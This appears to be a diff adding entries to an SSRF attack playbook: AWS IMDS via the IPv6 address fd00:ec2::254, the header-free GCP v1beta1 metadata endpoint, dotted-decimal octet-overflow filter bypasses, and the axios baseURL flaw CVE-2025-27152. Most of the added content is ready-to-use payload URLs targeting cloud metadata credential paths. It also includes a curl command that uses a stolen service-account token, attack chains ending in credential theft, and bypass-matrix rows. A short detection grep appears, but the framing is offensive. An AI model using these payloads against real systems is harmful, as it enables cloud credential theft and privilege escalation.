@@ -2396,9 +2396,129 @@ x-ignore: x
 
 ---
 
+## AWS EC2 IMDS IPv6 Endpoint (fd00:ec2::254)
+
+**Root cause:** AWS added a dedicated IPv6 address for the Instance Metadata Service: `fd00:ec2::254`. This is a separate address from the link-local `169.254.169.254` (IPv4) and is not the same as the IPv4-mapped IPv6 form `[::ffff:169.254.169.254]`. It uses the ULA (Unique Local Address) range `fd00::/8`. On EC2 instances with IPv6 enabled, both addresses serve the same IMDS endpoint. SSRF filters that block `169.254.169.254` in string form and even those that check for link-local IPv6 ranges (`fe80::/10`) may not block `fd00:ec2::254` because it falls in the ULA range, not link-local.
+
+**Bypass logic:** Three distinct representations of the AWS IMDS IP now exist: `169.254.169.254` (link-local IPv4), `[::ffff:169.254.169.254]` (IPv4-mapped IPv6), and `[fd00:ec2::254]` (ULA IPv6). A blocklist must explicitly cover all three. The ULA form is the most likely to evade — ULA ranges are not commonly included in SSRF blocklists because they are technically routable (unlike link-local). The string `fd00:ec2::254` contains an AWS-specific alphanumeric subdomain that may bypass naive regex patterns checking for IP addresses.
+
+**Attack chain:** SSRF → `[fd00:ec2::254]` bypasses `169.254.169.254` blocklist → AWS IMDS credentials → IAM pivot
+
+**Stack:** AWS EC2 instances with IPv6 VPC enabled (all modern EC2 instance types in VPCs with IPv6 CIDR)
+
+**Payload:**
+```
+# AWS IMDS via ULA IPv6 address (not link-local — different from ::ffff:169.254.169.254)
+http://[fd00:ec2::254]/latest/meta-data/
+http://[fd00:ec2::254]/latest/meta-data/iam/security-credentials/
+http://[fd00:ec2::254]/latest/meta-data/iam/security-credentials/<ROLE-NAME>
+http://[fd00:ec2::254]/latest/user-data/
+
+# IMDSv2 token via ULA IPv6:
+PUT http://[fd00:ec2::254]/latest/api/token
+X-aws-ec2-metadata-token-ttl-seconds: 21600
+
+# Comparison of all AWS IMDS representations:
+# IPv4:                   169.254.169.254
+# IPv4-mapped IPv6:       [::ffff:169.254.169.254] / [::ffff:a9fe:a9fe]
+# ULA IPv6 (NEW):         [fd00:ec2::254]
+# EC2 DNS hostname:       instance-data
+```
+
+**Source:** PayloadsAllTheThings SSRF-Cloud-Instances.md, AWS EC2 IPv6 IMDS documentation
+
+---
+
+## GCP Compute Metadata v1beta1 (No Header Required)
+
+**Root cause:** Google Cloud Platform's Instance Metadata Service (IMDS) has two API versions: `v1` (requires `Metadata-Flavor: Google` header) and `v1beta1` (legacy, does not require the header). The v1beta1 endpoint was kept for backward compatibility and makes no header validation requirement. This means SSRF vectors that cannot set custom HTTP headers (simple GET-based SSRF, URL-fetching libraries that strip custom headers) can still retrieve GCP instance metadata via the beta endpoint.
+
+**Bypass logic:** SSRF vectors that only issue GET requests without custom headers fail against `v1`. The `v1beta1` path produces the same sensitive data (service account tokens, project metadata, instance attributes) without requiring `Metadata-Flavor: Google`. This is the GCP equivalent of the IMDSv1/IMDSv2 distinction on AWS.
+
+**Attack chain:** GET-only SSRF → `/computeMetadata/v1beta1/` bypasses header requirement → GCP service account token → GCP API access → data exfil / privilege escalation
+
+**Stack:** GCP Compute Engine, GKE nodes, Cloud Run (on Compute Engine), App Engine Flex
+
+**Payload:**
+```
+# v1beta1 — no Metadata-Flavor header required
+http://metadata.google.internal/computeMetadata/v1beta1/
+http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token
+http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/email
+http://metadata.google.internal/computeMetadata/v1beta1/project/project-id
+
+# Via the link-local IP (bypasses hostname filters):
+http://169.254.169.254/computeMetadata/v1beta1/instance/service-accounts/default/token
+
+# Use token with GCP APIs:
+curl -H "Authorization: Bearer <TOKEN>" https://www.googleapis.com/storage/v1/b?project=PROJECT_ID
+```
+
+**Source:** PayloadsAllTheThings SSRF-Cloud-Instances.md, GCP Metadata Server documentation
+
+---
+
+## Dotted Decimal Overflow Bypass
+
+**Root cause:** Some URL parsing implementations allow individual octets in a dotted IPv4 address to exceed 255, handling overflow by taking the value modulo 256. A filter blocking `169.254.169.254` by string comparison will fail to recognize `425.510.425.510` as equivalent — the overflow arithmetic happens inside the HTTP client but not inside the validator.
+
+**Bypass logic:** `425 mod 256 = 169`, `510 mod 256 = 254` — so `425.510.425.510` parses to `169.254.169.254` in overflow-permissive implementations. The filter sees a syntactically invalid IP (octets > 255) and either rejects it as non-IP or fails to match its blocklist entry for `169.254.169.254`.
+
+**Attack chain:** SSRF → overflow octet IP bypasses string/value blocklist → resolves to 169.254.169.254 → AWS/GCP/Azure IMDS → credential theft
+
+**Stack:** Python urllib/requests (some versions), older curl/libcurl, PHP's curl wrapper
+
+**Payload:**
+```
+# 169.254.169.254 via dotted decimal overflow (425 mod 256=169, 510 mod 256=254)
+http://425.510.425.510/latest/meta-data/
+http://425.510.425.510/latest/meta-data/iam/security-credentials/
+
+# 127.0.0.1 via overflow (383 mod 256=127)
+http://383.0.0.1/
+http://383.256.256.1/
+```
+
+**Source:** PayloadsAllTheThings SSRF bypass section, IP address overflow bypass research
+
+---
+
+## Axios baseURL Bypass via Absolute URL (CVE-2025-27152)
+
+**Root cause:** In axios versions <1.8.2 / <0.30.0, supplying an absolute URL (starting with `http://`) to an axios instance with a `baseURL` set causes axios to ignore `baseURL` entirely. Any authentication headers configured on the instance (API keys, JWT tokens) are forwarded to the attacker-controlled destination, leaking credentials in addition to enabling SSRF.
+
+**Bypass logic:** The application developer's intent is that `baseURL` restricts all requests to a safe origin. Axios's behavior of prioritizing explicit absolute URLs over `baseURL` violates this assumption. Validation layers that check `baseURL` is trusted are bypassed.
+
+**Attack chain:** User-controlled URL → passed to `axios.get(userInput)` → absolute URL overrides baseURL → request sent to IMDS → credential theft; configured headers (API keys) also forwarded to attacker host
+
+**Stack:** Node.js applications using axios ≥1.0.0 <1.8.2 or <0.30.0 for webhook/import-from-URL/proxy features
+
+**Payload:**
+```javascript
+// Vulnerable pattern:
+const client = axios.create({
+  baseURL: 'https://trusted-internal-service.corp/',
+  headers: { 'X-API-KEY': 'secret-key-here' }
+});
+await client.get(userSuppliedUrl);  // user supplies absolute URL
+
+// Attack: supply absolute URL — baseURL is ignored, API key forwarded
+// userSuppliedUrl = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'
+```
+
+```bash
+# Detection:
+grep -r "axios.create" . | grep -i "baseURL"
+# CVE-2025-27152 — CVSS 7.7 — Fixed in: axios 1.8.2, 0.30.0
+```
+
+**Source:** CVE-2025-27152, GitHub Advisory GHSA-jr5f-v2jv-69x6, axios security release
+
+---
+
 ## Threat Model
 
-> Current patterns as of 2026-Q2. Updated 2026-05-30.
+> Current patterns as of 2026-Q2. Updated 2026-06-01.
 
 **What's being exploited in the wild (2026-05-30):**
 
@@ -2559,6 +2679,31 @@ x-ignore: x
     Burp's HTTP Request Smuggler extension automates detection. "HTTP/1.1 Must Die" (2025)
     documents the current state of exploitation.
 
+30. **AWS IMDS fd00:ec2::254 IPv6 address evades all link-local blocklists** — AWS's new
+    dedicated IPv6 IMDS address `[fd00:ec2::254]` is in the ULA range (fd00::/8), not
+    link-local (fe80::/10). Blocklists that cover link-local IPv6 but not ULA miss it
+    entirely. Three IMDS representations now exist: IPv4, IPv4-mapped IPv6, and ULA IPv6.
+    Only a complete RFC-5735/RFC-5156 reserved-range validator covers all three.
+
+31. **GCP v1beta1 metadata bypasses Metadata-Flavor header requirement** — GCP's legacy
+    v1beta1 metadata endpoint returns full service account tokens without requiring
+    `Metadata-Flavor: Google`. GET-only SSRF vectors that cannot inject custom headers
+    succeed against v1beta1 where they fail against v1. This is GCP's equivalent of
+    IMDSv1 and is equally under-tested by researchers defaulting to v1 paths.
+
+32. **Dotted decimal overflow targets parsers with non-compliant octet handling** — Octets
+    above 255 in a dotted decimal IP cause overflow in some HTTP client parsers, wrapping
+    to the correct internal value (425 mod 256 = 169). String-match blocklists only block
+    `169.254.169.254` verbatim — they do not trigger on `425.510.425.510`. Include in
+    every SSRF bypass wordlist.
+
+33. **Axios CVE-2025-27152 exposes Node.js apps using baseURL as an access boundary** —
+    Any Node.js service that creates an axios instance with `baseURL` set to a trusted
+    internal host and passes user-controlled strings to `axios.get()` / `axios.post()` is
+    vulnerable: supplying an absolute URL silently ignores baseURL. Headers (API keys,
+    JWTs) configured on the axios instance are leaked to the attacker-controlled destination.
+    Affects axios 1.0.0–1.8.1. Grep for `axios.create` + `baseURL` in any Node.js codebase.
+
 ---
 
 ## Bypass Matrix
@@ -2599,6 +2744,10 @@ x-ignore: x
 | Nginx off-by-slash `proxy_pass` (path confinement) | Append `../` after location prefix: `/api../` → backend sees `GET /` | Missing trailing slash on `location` lets traversal escape the intended backend sub-path |
 | Envoy sidecar admin API (service mesh pod) | `http://localhost:15000/certs`, `/config_dump`, `/clusters` | Unauthenticated localhost API exposes mTLS private keys and full mesh topology |
 | Front-end WAF / host allowlist (CL.TE desync) | Smuggle second request in chunked body with `Host: 127.0.0.1` | Back-end processes smuggled request as trusted internal request, bypassing all front-end controls |
+| Blocks `169.254.169.254` on AWS EC2 (link-local only) | `http://[fd00:ec2::254]/latest/meta-data/` | AWS ULA IPv6 IMDS address — different range from link-local, bypasses fe80::/10 filters |
+| Blocks `169.254.169.254` string + link-local ranges | `http://425.510.425.510/latest/meta-data/` | Dotted decimal overflow: 425 mod 256=169, 510 mod 256=254; parser wraps octets |
+| GCP metadata requires `Metadata-Flavor: Google` header | `http://metadata.google.internal/computeMetadata/v1beta1/` | Legacy v1beta1 endpoint accepts requests without the required header |
+| Node.js axios client with baseURL set to safe host | Pass absolute URL `http://169.254.169.254/...` directly to `axios.get()` | CVE-2025-27152: absolute URL overrides baseURL; configured auth headers also leaked |
 
 ---
 
@@ -2656,6 +2805,8 @@ x-ignore: x
 | Nginx acting as API gateway with off-by-slash `proxy_pass` config | Missing trailing slash enables `../` traversal past backend path restriction | Backend root access → internal admin endpoints, Spring Actuator, unauthenticated management APIs |
 | Envoy sidecar at `localhost:15000` (Istio / service mesh pods) | Unauthenticated admin API in every Istio-injected pod; exposes mesh topology + mTLS certs | Mesh identity theft — impersonate any pod in cluster → access all mesh-internal services |
 | HTTP back-end server behind CL.TE-vulnerable front-end proxy | CL.TE request smuggling — front-end passes SSRF filter, back-end processes smuggled internal request | Access to `/admin`, internal API paths, and management endpoints that front-end WAF blocks |
+| GCP Compute Metadata v1beta1 endpoint | Legacy beta endpoint: no `Metadata-Flavor` header required | GCP service account token theft via GET-only SSRF without custom header injection |
+| Node.js services using axios 1.0–1.8.1 with `baseURL` | CVE-2025-27152: absolute URL overrides `baseURL` restriction + auth headers forwarded | SSRF to any internal host + API key / JWT credential exfiltration to attacker server |
 
 ---
 
